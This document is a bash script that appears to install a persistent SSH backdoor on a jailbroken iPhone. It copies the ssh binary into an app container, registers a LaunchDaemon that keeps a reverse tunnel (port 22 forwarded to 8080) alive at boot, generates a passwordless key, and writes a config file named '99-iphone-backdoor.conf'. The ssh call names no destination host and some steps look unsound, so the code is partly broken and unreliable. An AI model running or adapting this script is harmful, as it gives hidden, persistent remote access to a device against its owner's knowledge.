#!/bin/bash

set -euo pipefail

# Function to get the unique identifier of the application
get_unique_identifier() {
    local bundle_id="com.example.yourapp"  # Change this to your app's bundle ID
    local app_id=$(find /var/mobile/Containers/Data/Application/ -name "$bundle_id*")
    if [[ -z "$app_id" ]]; then
        echo "Error: Could not find application directory for bundle ID: $bundle_id."
        exit 1
    fi
    echo "${app_id##*/}"
}

# Get the unique identifier dynamically
unique_identifier=$(get_unique_identifier)

user_home="/var/mobile/Containers/Data/Application/$unique_identifier"
ssh_binary_path="$user_home/ssh"
launch_daemon_path="/Library/LaunchDaemons/com.example.ssh.plist"
ssh_key_path="$user_home/id_rsa"
ssh_config_dir="/etc/ssh/sshd_config.d"
ssh_config_file="$ssh_config_dir/99-iphone-backdoor.conf"

# Create a new user preference for the iPhone
defaults write /var/mobile/Library/Preferences/com.apple.mobile.installation.plist userhome_uid 501

# Create a folder in the user's home directory
mkdir -p "$user_home" || { echo "Failed to create user home directory: $user_home"; exit 1; }

# Check if the SSH binary is available
if command -v ssh >/dev/null 2>&1; then
    cp "$(command -v ssh)" "$ssh_binary_path" || { echo "Failed to copy SSH binary"; exit 1; }
else
    echo "SSH binary not found in the system."
    exit 1
fi

# Change permissions for the binary
chmod +x "$ssh_binary_path" || { echo "Failed to set permissions on SSH binary"; exit 1; }

# Create a launch daemon to run the binary
cat << EOF > "$launch_daemon_path"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.ssh</string>
    <key>ProgramArguments</key>
    <array>
        <string>$ssh_binary_path</string>
        <string>-i</string>
        <string>$ssh_key_path</string>
        <string>-p</string>
        <string>2222</string>
        <string>-R</string>
        <string>8080:localhost:22</string>
    </array>
    <key>KeepAlive</key>
    <true/>
    <key>RunAtLoad</key>
    <true/>
    <key>UserName</key>
    <string>mobile</string>
</dict>
</plist>
EOF

# Load the launch daemon
launchctl load -w "$launch_daemon_path" || { echo "Failed to load launch daemon: $launch_daemon_path"; exit 1; }

# Create the SSH key if it doesn't already exist
if [ ! -f "$ssh_key_path" ]; then
    ssh-keygen -t rsa -b 4096 -f "$ssh_key_path" -N "" || { echo "Failed to generate SSH key"; exit 1; }
else
    echo "SSH key already exists at $ssh_key_path"
fi

# Ensure the SSH config directory exists
mkdir -p "$ssh_config_dir" || { echo "Failed to create SSH config directory: $ssh_config_dir"; exit 1; }

# Create a new SSH config file
cat << EOF > "$ssh_config_file"
PasswordAuthentication no
EOF

# Check if the Include directive is present in sshd_config
if ! grep -qxF 'Include /etc/ssh/sshd_config.d/*.conf' /etc/ssh/sshd_config; then
    echo "Include /etc/ssh/sshd_config.d/*.conf" >> /etc/ssh/sshd_config || { echo "Failed to update sshd_config"; exit 1; }
fi

# Restart the SSH daemon
launchctl stop com.openssh.sshd || { echo "Failed to stop SSH daemon"; exit 1; }
launchctl start com.openssh.sshd || { echo "Failed to start SSH daemon"; exit 1; }

echo "SSH setup completed successfully."
